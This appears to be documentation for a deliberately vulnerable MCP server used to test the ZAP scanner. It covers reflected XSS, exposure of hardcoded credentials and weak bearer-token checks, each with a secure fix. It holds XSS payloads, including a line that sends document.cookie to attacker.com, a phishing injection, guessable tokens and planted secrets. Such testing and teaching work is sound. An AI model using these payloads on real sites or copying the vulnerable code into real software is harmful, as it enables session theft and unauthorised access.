# Miscellaneous Vulnerabilities

This document covers three smaller vulnerability classes implemented in `tools/misc.py`.

---

## 1. Reflected Content / XSS-equivalent — CWE-79

### Description

User input is embedded in an HTML string without HTML-escaping.
If the MCP tool output is rendered in a browser or rich client, attacker-controlled
HTML/JavaScript will execute in that context.

### Vulnerable Code

```python
# tools/misc.py
def greet_user(name: str) -> str:
    return f"<html><body><h1>Hello, {name}!</h1></body></html>"
```

### Attack Payloads

Reflected XSS:
```
<script>alert(document.cookie)</script>
```

Image-based XSS:
```
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

HTML injection (phishing):
```
</h1><h2>Your session has expired. <a href="http://attacker.com/login">Click here to login</a>
```

### ZAP Detection

ZAP's XSS active scanner should detect that the input is reflected unescaped in the response.

### Secure Fix

```python
import html
def greet_user(name: str) -> str:
    return f"<html><body><h1>Hello, {html.escape(name)}!</h1></body></html>"
```

---

## 2. Sensitive Data Exposure — CWE-200

### Description

`get_config()` returns hardcoded application credentials, cloud keys, and internal endpoints
to any caller without authentication. No parameters required.

### MCP Call

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {"name": "get_config", "arguments": {}},
  "id": 1
}
```

### Expected Response

```
database_url:      sqlite:////app/data/users.db
aws_access_key:    AKIAIOSFODNN7EXAMPLE
aws_secret_key:    wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
jwt_secret:        my_jwt_signing_secret
admin_password:    Sup3rS3cr3t!
internal_endpoint: http://internal-api.evmcp.local:9000
smtp_password:     smtp_p@ssw0rd
debug_mode:        true
allowed_hosts:     *
```

### ZAP Detection

ZAP's Information Disclosure scanner should detect:
- AWS key patterns (`AKIA...`)
- Password fields in response body
- Internal endpoint URLs

---

## 3. Weak Authentication — CWE-287

### Description

`check_auth` validates a bearer token against a hardcoded set of trivially guessable values.
The MCP endpoint itself has no authentication — this tool demonstrates weak token logic.

### Attack Payloads

All of these tokens are accepted:
```
secret123
admin
letmein
password
```

### MCP Call

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "check_auth",
    "arguments": {"token": "admin"}
  },
  "id": 1
}
```

### Expected Response

```
Authenticated. Role: admin. Token accepted.
```

### ZAP Detection

ZAP's Authentication scanner / Fuzzer should detect:
- Common password wordlist tokens return `Authenticated` responses
- `Role: admin` in response indicates privilege escalation via token guessing

### Secure Fix

Use cryptographically random tokens, store only hashed values, and implement rate limiting:

```python
import secrets, hmac
TOKEN_HASH = hmac.new(b"key", b"<random_token>", "sha256").hexdigest()

def check_auth(token: str) -> str:
    submitted = hmac.new(b"key", token.encode(), "sha256").hexdigest()
    if hmac.compare_digest(submitted, TOKEN_HASH):
        return "Authenticated."
    return "Authentication failed."
```
